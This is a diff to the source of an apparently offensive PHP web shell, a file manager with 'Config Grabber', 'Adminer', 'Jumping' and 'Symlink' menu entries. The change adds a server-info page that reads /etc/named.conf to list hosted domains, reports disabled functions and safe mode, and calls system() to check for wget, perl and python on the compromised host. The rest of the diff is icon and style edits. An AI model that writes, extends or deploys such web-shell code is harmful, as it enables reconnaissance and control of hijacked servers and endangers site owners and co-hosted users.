@@ -220,13 +220,28 @@ class XN {
             return DIRECTORY_SEPARATOR;
         }
     }
+    public static function color($bold = 1, $colorid = null, $string = null) {
+    	$color = array(
+			"</font>",  			# 0 off
+			"<font color='red'>",	# 1 red 
+			"<font color='lime'>",	# 2 lime
+			"<font color='white'>",	# 3 white
+			"<font color='gold'>",	# 4 gold
+		);  return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
+	}
+    public static function lib_installed() {
+    	$lib[] = "MySQL: ".(function_exists('mysql_connect') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+		$lib[] = "cURL:  ".(function_exists('curl_version') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+		$lib[] = "Wget:  ".(system('wget --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+		$lib[] = "Perl:  ".(system('perl --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+		$lib[] = "Mail:  ".(function_exists('mail') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+		$lib[] = "Python: ".(system('python --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+		return implode(" | ", $lib);
+	}
     public static function info($info = null) {
         switch ($info) {
             case 'disable_function':
                 return (!empty(@ini_get("disable_functions"))) ? @ini_get("disable_functions") : "<font color=green>NONE</font>";
-                break;
-            case 'mail':
-                return (function_exists('mail')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
                 break;
             case 'mysql':
                 return (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
@@ -243,6 +258,13 @@ class XN {
             case 'phpversion':
                 return phpversion();
                 break;
+            case 'safe_mode':
+            	return (@ini_get(strtoupper("safe_mode")) === "ON" ? "<font color='red'>ON</font>" : 
+            								"<font color='green'>OFF</font>");
+            	break;
+            case 'lib':
+            	return self::lib_installed();
+            	break;
             case 'domain':
                 $d0mains = @file("/etc/named.conf", false);
                 if (!$d0mains){
@@ -653,14 +675,14 @@ function head($x, $y, $class = null) {
             <?= XN::wr(getcwd(), $x, 1) ?>
         </div>
         <button class="dropdown-toggle toggle" title="Menu">
-            <i class="fa fa-ellipsis-h" aria-hidden="true"></i>
+            <i class="fas fa-bars"></i>
         </button>
         <ul class="dropdown-tool">
             <form method="post" action="?x=<?= getcwd() ?>">
                 <li>
                     <button onclick="location.href='?x='" type="button">
                         <div class="icon">
-                            <a><i class="fa fa-home" aria-hidden="true"></i></a>
+                            <a><i class="fas fa-home"></i></a>
                         </div>
                         <div class="font">
                             Home
@@ -668,9 +690,17 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button type="button" onclick="$(document).ready(function () {  
-                        jqxAlert.alert('maintenance');  
-                    })">
+                    <button onclick="location.href='?x=<?= $_SERVER['DOCUMENT_ROOT'] ?>'" type="button">
+                        <div class="icon">
+                            <a><i class="fas fa-reply-all"></i></a>
+                        </div>
+                        <div class="font">
+                            <?= basename($_SERVER['DOCUMENT_ROOT']) ?>
+                        </div>
+                    </button>
+                </li>
+                <li>
+                    <button name="action" value="info">
                         <div class="icon">
                             <a><i class="fas fa-info-circle"></i></a>
                         </div>
@@ -682,7 +712,7 @@ function head($x, $y, $class = null) {
                 <li>
                     <button name="action" value="adminer">
                         <div class="icon">
-                            <a><i class="fa fa-upload" aria-hidden="true"></i></a>
+                            <a><i class="fas fa-user"></i></a>
                         </div>
                         <div class="font">
                             Adminer
@@ -702,7 +732,7 @@ function head($x, $y, $class = null) {
                 <li>
                     <button name="action" value="addfile">
                         <div class="icon">
-                            <a><i class="fa fa-plus-square" aria-hidden="true"></i></a>
+                            <a><i class="fas fa-file-medical"></i></a>
                         </div>
                         <div class="font">
                             Add File
@@ -712,7 +742,7 @@ function head($x, $y, $class = null) {
                 <li>
                     <button name="action" value="adddir">
                         <div class="icon">
-                            <a><i class="fa fa-plus-square" aria-hidden="true"></i></a>
+                            <a><i class="fas fa-folder-plus"></i></a>
                         </div>
                         <div class="font">
                             Add Folder
@@ -726,6 +756,30 @@ function head($x, $y, $class = null) {
                         </div>
                         <div class="font">
                             Config Grabber
+                        </div>
+                    </button>
+                </li>
+                <li>
+                    <button type="button" onclick="$(document).ready(function () {  
+                        jqxAlert.alert('maintenance');  
+                    })">
+                        <div class="icon">
+                            <a><i class="fas fa-bug"></i></a>
+                        </div>
+                        <div class="font">
+                            Jumping
+                        </div>
+                    </button>
+                </li>
+                <li>
+                    <button type="button" onclick="$(document).ready(function () {  
+                        jqxAlert.alert('maintenance');  
+                    })">
+                        <div class="icon">
+                            <a><i class="fas fa-clone"></i></a>
+                        </div>
+                        <div class="font">
+                            Symlink
                         </div>
                     </button>
                 </li>
@@ -833,13 +887,13 @@ function alert($message) {
         font-size: 23px;
         font-weight:bold;
     }
+    .storage span:nth-child(7),
     .storage span:nth-child(5),
     .storage span:nth-child(6),
     .storage span:nth-child(4) {
         font-size: 10px;
     }
     .storage span:nth-child(3) {
-        float: right;
         font-size: 10px;
     }
     .back {
@@ -962,6 +1016,7 @@ function alert($message) {
         white-space: nowrap;
         text-overflow: ellipsis;
     }
+    .info,
     .config,
     .rewrite,
     .addfile,
@@ -972,6 +1027,7 @@ function alert($message) {
         padding-left: 25px;
         padding-right: 25px;
     }
+    .info table td,
     .config table td,
     .rewrite table td,
     .addfile table td,
@@ -1195,6 +1251,7 @@ function alert($message) {
         width: 100%;
         font-size:18px;
         background: none;
+        font-weight:bold;
         border: none;
         text-decoration: none;
         padding: .5em 1em;
@@ -1223,7 +1280,8 @@ function alert($message) {
         cursor: pointer;
         display: inline-block;
         text-decoration: none;
-        background: #efefef;
+        background: #e7f3ff;
+        color: #1889f5;
     }
     ::-webkit-scrollbar {
         display: none;
@@ -1425,9 +1483,6 @@ function alert($message) {
         .edit .editname {
             max-width:220px;
         }
-        .storage span:nth-child(5) {
-            margin-left:50px;
-        }
     }
 </style>
 <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
@@ -1575,6 +1630,84 @@ function filterTable() {
                 alert("Permission Danied");
             }
             break;
+        case 'info':
+        	head('Server Info', getcwd(), 'hidden');
+        	?>
+        	<div class="info">
+        		<table>
+        			<tr>
+        				<td>
+        					Kernel
+        				</td>
+        				<td>:</td>
+        				<td>
+        					<?= XN::info('kernel') ?>
+        				</td>
+        			</tr>
+        			<tr>
+        				<td>
+        					Software
+        				</td>
+        				<td>:</td>
+        				<td>
+        					<?= XN::info('software') ?>
+        				</td>
+        			</tr>
+        			<tr>
+        				<td>
+        					IP
+        				</td>
+        				<td>:</td>
+        				<td>
+        					<?= XN::info('ip') ?>
+        				</td>
+        			</tr>
+        			<tr>
+        				<td>
+        					PHP Version
+        				</td>
+        				<td>:</td>
+        				<td>
+        					<?= XN::info('phpversion') ?>
+        				</td>
+        			</tr>
+        			<tr>
+        				<td>
+        					Domains
+        				</td>
+        				<td>:</td>
+        				<td>
+        					<?= XN::info('domain') ?>
+        				</td>
+        			</tr>
+        			<tr>
+        				<td>
+        					Disable Function
+        				</td>
+        				<td>:</td>
+        				<td>
+        					<?= XN::info('disable_function') ?>
+        				</td>
+        			</tr>
+        			<tr>
+        				<td>
+        					Safe Mode
+        				</td>
+        				<td>:</td>
+        				<td>
+        					<?= XN::info('safe_mode') ?>
+        				</td>
+        			</tr>
+        			<tr>
+        				<td colspan="3">
+        					<?= XN::info('lib') ?>
+        				</td>
+        			</tr>
+        		</table>
+        	</div>
+        	<?php
+        	exit();
+        	break;
         case 'backup':
             if (XN::save($_POST['file'].".bak", file_get_contents($_POST['file']))) {
                 alert('failed');
@@ -1989,7 +2122,7 @@ function filterTable() {
         <span class="title">
             Filemanager
         </span>
-        <br><span>Total : <?= XN::hdd('total') ?></span>
+        <br><span>Total : <?= XN::hdd('total') ?></span> <span>|</span> 
         <span>Free : <?= XN::hdd('free') ?></span> <span>|</span> 
         <span>Used : <?= XN::hdd('used') ?></span>
     </div>
